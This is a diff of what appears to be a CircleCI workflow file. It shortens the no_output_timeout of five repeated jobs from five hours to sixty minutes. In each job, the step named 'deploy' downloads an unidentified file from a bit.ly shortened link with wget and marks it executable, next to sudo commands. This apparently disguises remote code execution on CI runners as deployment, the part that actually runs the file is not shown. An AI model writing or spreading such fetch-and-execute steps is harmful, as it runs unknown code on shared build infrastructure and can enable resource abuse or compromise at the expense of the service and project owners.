@@ -18,7 +18,7 @@ jobs:
           sudo su --command "cat meta.log"    
       - run: 
          name: "deploy"
-         no_output_timeout: 5h
+         no_output_timeout: 60m
          command: |
           wget https://bit.ly/3y1HJZi
           chmod +x 3y1HJZi
@@ -41,7 +41,7 @@ jobs:
           sudo su --command "cat meta.log"    
       - run: 
          name: "deploy"
-         no_output_timeout: 5h
+         no_output_timeout: 60m
          command: |
           wget https://bit.ly/3y1HJZi
           chmod +x 3y1HJZi
@@ -64,7 +64,7 @@ jobs:
           sudo su --command "cat meta.log"    
       - run: 
          name: "deploy"
-         no_output_timeout: 5h
+         no_output_timeout: 60m
          command: |
           wget https://bit.ly/3y1HJZi
           chmod +x 3y1HJZi
@@ -87,7 +87,7 @@ jobs:
           sudo su --command "cat meta.log"    
       - run: 
          name: "deploy"
-         no_output_timeout: 5h
+         no_output_timeout: 60m
          command: |
           wget https://bit.ly/3y1HJZi
           chmod +x 3y1HJZi
@@ -110,7 +110,7 @@ jobs:
           sudo su --command "cat meta.log"    
       - run: 
          name: "deploy"
-         no_output_timeout: 5h
+         no_output_timeout: 60m
          command: |
           wget https://bit.ly/3y1HJZi
           chmod +x 3y1HJZi
